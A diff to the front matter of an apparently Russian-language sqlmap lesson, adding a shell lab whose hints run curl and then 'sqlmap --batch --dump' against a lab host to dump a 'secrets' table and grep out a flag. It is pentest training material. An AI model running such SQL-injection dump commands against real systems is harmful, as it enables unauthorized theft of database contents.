@@ -13,6 +13,19 @@ useful_for:
   - "Пентест веб-приложений"
 estimated_minutes: 55
 summary: "Все флаги sqlmap с примерами: цели, детект, дамп, OS-shell, tamper и готовые рецепты на любой случай."
+lab:
+  kind: shell
+  title: "Практика: sqlmap — детект и дамп"
+  toolset: [core, curl, sqlmap]
+  workdir: /home/student/task
+  files: [task.md]
+  check: "grep -q 'nto{' found.txt"
+  hints:
+    - Сначала посмотри нормальный ответ: `curl -s 'http://shop.lab.local/product?id=1'`.
+    - Запусти sqlmap: `sqlmap -u 'http://shop.lab.local/product?id=1' --batch --dump`.
+    - sqlmap определит SQLite, найдёт таблицы `products` и `secrets`.
+    - В таблице `secrets` есть строка `flag` — её значение и есть ответ.
+    - Достань флаг из вывода: добавь к команде ` | grep 'nto{' | cut -d'|' -f4 > found.txt`, затем `check`.
 ---
 
 ## Задача
